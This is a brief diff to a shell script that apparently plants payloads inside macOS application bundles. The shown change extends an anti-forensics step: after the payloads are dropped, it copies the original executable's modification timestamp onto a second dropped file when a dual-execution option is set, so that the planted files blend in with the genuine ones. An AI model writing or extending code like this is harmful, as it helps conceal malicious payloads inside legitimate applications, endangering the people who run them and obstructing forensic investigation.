@@ -256,6 +256,9 @@ if [ "$hidden" == "true" ];then
 	done
 	# Set the dropped payloads timestamp to same as original executable
 	touch -m "${timestamp[4]}" "$target/Contents/MacOS/$payloadname"
+	if [ "$dualexec" == "true" ];then
+		touch -m "${timestamp[4]}" "$target/Contents/MacOS/$depn"
+	fi
 fi
 ### 10 Exit
 # Thats all folks!
